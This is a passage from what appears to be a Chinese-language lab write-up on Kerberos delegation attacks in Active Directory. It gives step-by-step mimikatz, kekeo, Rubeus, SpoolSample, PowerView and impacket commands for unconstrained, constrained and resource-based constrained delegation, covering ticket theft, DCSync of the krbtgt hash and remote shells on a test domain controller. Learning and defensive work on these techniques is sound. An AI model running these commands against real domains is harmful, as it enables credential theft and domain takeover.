+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406115059827.png"
+                      alt="image-20230406115059827"
+                ></p>
+<p>查询域内设置了非约束委派的机器账户</p>
+<p>执行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=hack-my,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406115348386.png"
+                      alt="image-20230406115348386"
+                ></p>
+<h6 id="接下来开始攻击-利用1"><a href="#接下来开始攻击-利用1" class="headerlink" title="接下来开始攻击  利用1"></a>接下来开始攻击  利用1</h6><p>可以让域管理员访问被控主机</p>
+<p>前提：找到配置了非约束委派的机器Alice并获得了管理员权限</p>
+<p>Alice的mimikatz执行，查看本地票据，导出，没有administrator</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; exit</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406135014457.png"
+                      alt="image-20230406135014457"
+                ></p>
+<p>回到域控执行，让域管理员访问Alice，就会在Alice主机中产生TGT票据</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\alice.hack-my.com</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406120142914.png"
+                      alt="image-20230406120142914"
+                ></p>
+<p>回到Alice重新导出票据</p>
+<p>但是不知道为什么还是没有administrator</p>
+<p>只能看看别人的了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/v2-bcefc178a80cab8bb1a6792a7db72ff1_r.jpg"
+                      alt="img"
+                ></p>
+<p>别人有admin</p>
+<p>然后就利用下面这个命令，使用这个导出的票据</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptt [0;36eb98]-2-0-60a10000-Administrator@krbtgt-HAISHI.COM.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>然后访问共享文件夹就可以访问得到了</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\dc.hack-my.com\c$</span><br></pre></td></tr></table></figure></div>
+
+<p>这种方式在实战情况下，除非域管理员连接过该服务，否则十分的鸡肋</p>
+<h6 id="利用2"><a href="#利用2" class="headerlink" title="利用2"></a>利用2</h6><p>特定情况下可以利用打印机服务Spooler，让域控主动连接</p>
+<p>主要原理就是强迫运行打印机服务（Print Spooler）的主机向目标主机发起Kerberos或者NTLM认证请求</p>
+<p>因为在Spooler服务默认开启的情况下，域用户可以利用windows打印机系统远程协议（MS-RPRN）强制任何运行了Spooler服务的域内计算机通过Kerberos或NTLM对任何目标进行认证</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">需要</span><br><span class="line">administrator权限</span><br><span class="line">得到域用户的账户密码</span><br><span class="line">域控打开打印机服务</span><br></pre></td></tr></table></figure></div>
+
+<h6 id="攻击流程-1"><a href="#攻击流程-1" class="headerlink" title="攻击流程"></a>攻击流程</h6><p>首先域控得先打开打印机服务</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406164452743.png"
+                      alt="image-20230406164452743"
+                ></p>
+<p>有一种就是直接运行SpoolSample</p>
+<p>指令</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spoolsample.exe DC Alice</span><br><span class="line"># 表示利用打印服务强制让域控机向Alice主机验证身份</span><br></pre></td></tr></table></figure></div>
+
+<p>这样就会生成一个票据，然后就和上面的一样了，导出票据，执行票据就行了</p>
+<p>但是上面的票据，我实操没发现administraotr的票据</p>
+<p>还有一种是使用Rubeus来监听的</p>
+<p>先利用Rubeus在域用户主机上运行，需要本地管理员权限</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:1 /filteruser:DC$</span><br><span class="line"># 我们可以用Rubeus来监听Event ID为4624事件，这样可以第一时间截取到域控的TGT</span><br><span class="line"># /interval:1 设置监听间隔1秒</span><br><span class="line"># /filteruser 监听对象为我们的域控，注意后面有个$，如果不设置监听对象就监听所有的TGT</span><br><span class="line"># DC$为域控的主机名字加$</span><br></pre></td></tr></table></figure></div>
+
+<p>我的域用户主机rubeus运行不起来，应该要在域用户主机上生成</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406175636951.png"
+                      alt="image-20230406175636951"
+                ></p>
+<p>这是别人的图</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/2e69c11052ca3f45e6ed166b0a86ed8f.png"
+                      alt="img"
+                ></p>
+<p>然后利用SPoolSample让域控强制向本机验证身份</p>
+<p>需要以域用户身份运行</p>
+<p>具体操作</p>
+<p>运行<code>runas /user:[http://haishi.com](https://link.zhihu.com/?target=http%3A//haishi.com)\many powershell</code>打开一个域用户权限的powershell</p>
+<p>然后运行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spoolsample.exe DC Alice</span><br><span class="line"># 表示利用打印服务强制让域控机向Alice主机验证身份，这样我们的Rubeus就可以监听到TGS了</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/ea7756068b739208f63908f1a2c2e4d0.png"
+                      alt="img"
+                ></p>
+<p>这个加了换行，所以可以用python去掉换行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data=&quot;&quot;</span><br><span class="line">for line in open(&#x27;1.txt&#x27;,&#x27;r&#x27;):</span><br><span class="line">    data += line.strip(&#x27;\n&#x27;)</span><br><span class="line">with open(&quot;2.txt&quot;,&#x27;a&#x27;) as f:</span><br><span class="line">    f.write(data)</span><br><span class="line">print(&#x27;保存完毕&#x27;)</span><br></pre></td></tr></table></figure></div>
+
+<p>复制2.txt中的TGT</p>
+<p>本地管理员权限运行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe ptt /ticket:2.txt中的TGT值</span><br></pre></td></tr></table></figure></div>
+
+<p>然后mimikatz执行，就可以获取krbtgt的NTLM hash值了</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:hack-my.com /all /csv&quot; exit</span><br></pre></td></tr></table></figure></div>
+
+<p>然后也能用smbexec.py获取域控权限</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python smbexec.py -hashes :NTLM-HASH administrator@192.168.30.10</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="约束委派攻击"><a href="#约束委派攻击" class="headerlink" title="约束委派攻击"></a>约束委派攻击</h4><p>由于非约束委派的不安全性，微软在win2003中发布了约束委派功能，对Kerberos协议进行了拓展，引入了S4U协议：S4U2Self和S4U2proxy。</p>
+<h6 id="S4U2Self：用于生成本身服务TGS票据"><a href="#S4U2Self：用于生成本身服务TGS票据" class="headerlink" title="S4U2Self：用于生成本身服务TGS票据"></a>S4U2Self：用于生成本身服务TGS票据</h6><p>允许受约束委派的服务代表任意用户向KDC请求服务自身，从而获得一张该用户的对当前受约束委派服务的票据TGS，改服务票据TGS包含了用户的相关信息，如用户的信息组等</p>
+<h6 id="S4U2proxy：保证只能访问特定服务（最大区别）"><a href="#S4U2proxy：保证只能访问特定服务（最大区别）" class="headerlink" title="S4U2proxy：保证只能访问特定服务（最大区别）"></a>S4U2proxy：保证只能访问特定服务（最大区别）</h6><p>允许受约束委派的服务通过服务票据ST，然后代表用户去请求指定的服务</p>
+<p>在约束委派中，用户还是会将TGT发送给相关受委派的服务，但是由于S4U2proxy的影响，对发送给受委派的服务去访问其他服务作了限制</p>
+<p>他不允许受委派的服务代表用户使用这个TGT去访问任意服务，而只能访问指定服务</p>
+<h6 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h6><p>通过上述了解，如果我们获取了service1的权限之后，就可以伪造S4U先请求service1本身的一个ST，然后利用这个ST便可以伪造任意用户请求去获取service2的ST了</p>
+<h6 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h6><p>对win2008设置约束委派，委派win2008可以访问DC的CIFS请求</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406210828223.png"
+                      alt="image-20230406210828223"
+                ></p>
+<p>服务账户</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406205915345.png"
+                      alt="image-20230406205915345"
+                ></p>
+<p>然后利用adfind查询约束委派主机的机器用户</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=hack-my,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406210930711.png"
+                      alt="image-20230406210930711"
+                ></p>
+<p>查询服务账户</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=hack-my,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406211118085.png"
+                      alt="image-20230406211118085"
+                ></p>
+<h6 id="利用1"><a href="#利用1" class="headerlink" title="利用1"></a>利用1</h6><p>使用机器账户wein2008-web</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">条件</span><br><span class="line">administrator权限</span><br><span class="line">获取了位置了约束委派的服务账户或者机器账户的凭据、密码或者hash都可</span><br></pre></td></tr></table></figure></div>
+
+<p>先通过mimikatz获取web的票据</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot;&quot;sekurlsa::tickets /export&quot;exit&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406213220426.png"
+                      alt="image-20230406213220426"
+                ></p>
+<p>然后再用kekeo申请服务票据</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;tgs::s4u /tgt:[0;3e7]-2-2-40e10000-WEB$@krbtgt-HACK-MY.COM.kirbi /user:Administrator@hack-my.com /service:cifs/DC.hack-my.com&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406213404970.png"
+                      alt="image-20230406213404970"
+                ></p>
+<p>使用mimikatz导入票据</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptt TGS_Administrator@HACK-MY.com@HACK-MY.COM_cifs~DC.haishi.com@HACK-MY.COM.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>之后<code>dir \\dc.hack-my.com\c$</code>就可以访问了</p>
+<h6 id="利用2-1"><a href="#利用2-1" class="headerlink" title="利用2"></a>利用2</h6><p>使用机器账户的hash</p>
+<p>要先获取机器账户的hash（mmimikatz）</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot;&quot;sekurlsa::logonpasswords&quot;&quot;exit&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406214505772.png"
+                      alt="image-20230406214505772"
+                ></p>
+<p>使用kekeo请求win2008-web的TGT票据</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;tgt::ask /user:win2008-web /domain:hack-my.com /NTLM:48b1ee6132349190ee7c47d4b5d91608&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406214622142.png"
+                      alt="image-20230406214622142"
+                ></p>
+<p>伪造S4U请求，伪造Administrator用户权限访问受委派的CIFS服务</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 申请administrator权限的票据</span><br><span class="line">kekeo.exe &quot;tgs::s4u /tgt:TGT_win2008-web@HACK-MY.COM_krbtgt~hack-my.com@HACK-MY.COM.kirbi /user:Administrator /service:cifs/dc.hack-my.com&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406215440285.png"
+                      alt="image-20230406215440285"
+                ></p>
+<p>然后使用mimikatz导入S4U2proxy阶段生成的ST，便可以进行成功的访问CIFS服务</p>
+<p><code>dir \\dc.hack-my.com\c$</code></p>
+<h6 id="利用3"><a href="#利用3" class="headerlink" title="利用3"></a>利用3</h6><p>在获取hash值之后</p>
+<p>就可以利用impacket套件里面的getST直接获取shell</p>
+<p>用getST申请服务票据</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 getST.py -dc-ip 192.168.30.10 -spn CIFS/dc.hack-my.com -impersonate administrator hack-my.com/WIN2008-WEB$ -hashes :48b1ee6132349190ee7c47d4b5d91608</span><br></pre></td></tr></table></figure></div>
+
+<p>然后就可以导入票据了</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br><span class="line">python3 wmiexec.py -k hack-my.com/administrator@dc.hack-my.com -no-pass -dc-ip 192.168.30.10</span><br><span class="line"></span><br><span class="line">或者（权限更高）</span><br><span class="line">python3 psexec.py -no-pass -k dc.hack-my.com -dc-ip 192.168.30.10</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>然后就可以远程连接了</p>
+<p>注意这里需要将域名加入host中</p>
+<p><code>192.168.30.10 dc.hack-my.com</code></p>
+<h6 id="利用4"><a href="#利用4" class="headerlink" title="利用4"></a>利用4</h6><p>使用服务账户Alice</p>
+<p>可以直接使用密码</p>
+<p>首先利用kekeo申请TGT（ST）票据</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;tgt::ask /user:Alice /domain:hack-my.com /password:Admin！@#45 /ticket:Alice.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>然后就可以利用这个TGT去伪造其他用户来申请一个TGS的票据</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;Tgs::s4u /tgt:TGT_Alice@HACK-MY.COM_krbtgt~hack-my.com@HACK-MY.COM.kirbi /user:administrator@hack-my.com /service:cifs/dc.hack-my.com&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>然后就可以利用mimikatz将这个TGS票据导入</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptt TGS_Administrator@hack-my.com@HACK-MY.COM_cifs~DC.hack-my.com@HACK-MY.COM.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>然后就可以访问</p>
+<p><code>dir \\dc.hack-my.com\c$</code></p>
+<p>还有就是一个获取服务账户的hash来进行的，和上面的差不多就不说了</p>
+<h4 id="基于资源的约束性委派"><a href="#基于资源的约束性委派" class="headerlink" title="基于资源的约束性委派"></a>基于资源的约束性委派</h4><p>基于资源的约束性委派是在win2012中加入的，和传统的委派相比，不需要域管理员权限去设置相关属性</p>
+<p>基于资源的约束委派允许资源配置受信任的账户委派给他们</p>
+<p>基于资源的约束委派将委派的控制权交给拥有被访问资源的管理员</p>
+<p>这是因为上面的特性，这就导致了正常只要是域用户都有权限进行委派的操作</p>
+<h6 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h6><p>委派的权限给到了拥有资源的后端，而不再是赋值的前端</p>
+<p>可以跨域和林委派</p>
+<p>不用域管理员权限设置委派，只需拥有将计算机加入域的域用户和机器自身拥有的权限</p>
+<h6 id="差别"><a href="#差别" class="headerlink" title="差别"></a>差别</h6><p>传统的委派是想办法让域控请求A这样A就可以利用域控的身份去请求B的服务</p>
+<p>基于资源的约束委派则是相反的，它是改变A的SID，达到让A模拟用户访问B资源的目的</p>
+<p>msDS-AllowedToActOnBehalfOfOtherIdentity属性指向委派账户</p>
+<h6 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h6><ol>
+<li><p>具有对主机修改<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的权限</p>
+<p>(如已经控制的主机是WEB 则具有修改WEB主机的msDS-AllowedToActOnBehalfOfOtherIdentity的权限账户)</p>
+</li>
+<li><p>可以创建机器账户的域用户（或已知机器账户）</p>
+</li>
+</ol>
+<p>服务账户可以将机器账户加入域，最多10个</p>
+<p>能够修改msDS-AllowedToActOnBehalfOfOtherIdentity属性的只有将主机加入域的用户和主机的机器账户</p>
+<h6 id="怎么查看是谁把你加入域的"><a href="#怎么查看是谁把你加入域的" class="headerlink" title="怎么查看是谁把你加入域的"></a>怎么查看是谁把你加入域的</h6><p>账户中有个msDS-CreatorSID属性，用于标记加入域时使用的用户的SID值，这样就可以知道是谁把你加入域的</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -h 192.168.30.20 -b &quot;DC=hack-my,DC=com&quot; -f &quot;objectClass=computer&quot; mS-DS-CreatorSID</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h6 id="Account-Operators组内用户"><a href="#Account-Operators组内用户" class="headerlink" title="Account Operators组内用户"></a>Account Operators组内用户</h6><p>Account Operators组内用户可以修改域内任意主机（除了域控）的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性</p>
+<p>所以我们拿到了这个权限就可以拿到除域控外所有机器的system权限</p>
+<h6 id="利用1-1"><a href="#利用1-1" class="headerlink" title="利用1"></a>利用1</h6><p>攻击思路：</p>
+<p>前提是获取Alice权限</p>
+<p>利用一个服务账户Alice创建一个机器账户</p>
+<p>然后修改WIN2008-WEB的msDS-AllowedToActOnBehalfOfOtherIdentity 为新创建的机器用户的sid</p>
+<p>然后利用机器账户申请票据 进行提权</p>
+<h6 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h6><p>先利用Powermad.ps1创建一个机器账号</p>
+<p>名字test1，密码123456</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell</span><br><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">import-module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount test1 -Password $(ConvertTo-SecureString &quot;123456&quot; -AsPlainText -Force)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230407170719758.png"
+                      alt="image-20230407170719758"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230407171019208.png"
+                      alt="image-20230407171019208"
+                ></p>
+<p>利用powerView查询机器账户的SID</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerView.ps1</span><br><span class="line">Get-NetComputer test1 -Properties objectsid</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230407220117870.png"
+                      alt="image-20230407220117870"
+                ></p>
+<p>test1 sid：S-1-5-21-1400638014-602433399-2258725660-1148</p>
+<p>设置委派</p>
+<p>修改WEB的msds-allowedtoactonbehalfofotheridentity的值，把他的sid改为test1的sid</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">利用powerView</span><br><span class="line">powershell</span><br><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">import-module .\powerview.ps1</span><br><span class="line">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1400638014-602433399-2258725660-1148)&quot;</span><br><span class="line">$SDBytes = New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Get-DomainComputer WEB| Set-DomainObject -Set @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure></div>
+
+<p>查询是否修改成功</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainComputer WEB -Properties msds-allowedtoactonbehalfofotheridentity</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230407220808294.png"
+                      alt="image-20230407220808294"
+                ></p>
+<p>清除 msds-allowedtoactonbehalfofotheridentity 属性的值</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-DomainObject WEB -Clear &#x27;msds-allowedtoactonbehalfofotheridentity&#x27; -Verbose</span><br></pre></td></tr></table></figure></div>
+
+<p>再生成票据</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 getST.py -dc-ip 192.168.30.20 hack-my.com/test1\$:123456 -spn cifs/WEB.hack-my.com -impersonate administrator</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230407221007040.png"
+                      alt="image-20230407221007040"
+                ></p>
+<p>最后导入票据</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache   </span><br><span class="line"></span><br><span class="line">python3 wmiexec.py WEB.haishi.com -no-pass -k -dc-ip 192.168.30.20</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230408124248309.png"
+                      alt="image-20230408124248309"
+                ></p>
+<p>这里还是需要将域名加入到hosts</p>
+<p>利用psexec上去的权限更高</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 psexec.py -k haishi.com/administrator@WEB.haishi.com -no-pass</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230408124555238.png"
+                      alt="image-20230408124555238"
+                ></p>
+<h6 id="利用2-2"><a href="#利用2-2" class="headerlink" title="利用2"></a>利用2</h6><p>刚才讲过Acount Operators组用户可以获得除域控外所有主机的权限</p>
+<p>是因为Acount Operators组成员可以修改域内除了域控其他所有主机的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性</p>
+<p>在本地先设置一个Acount Operators组成员，设置Alice为这个</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230408151945659.png"
+                      alt="image-20230408151945659"
+                ></p>
+<p>可以利用Adfind查询Acount Operators组成员</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adfind.exe -h 192.168.30.10:389 -s subtree -b CN=&quot;Account Operators&quot;,CN=Builtin,DC=hack-my,DC=com member</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230408152951481.png"
+                      alt="image-20230408152951481"
+                ></p>
+<p>然后创建一个机器账户</p>
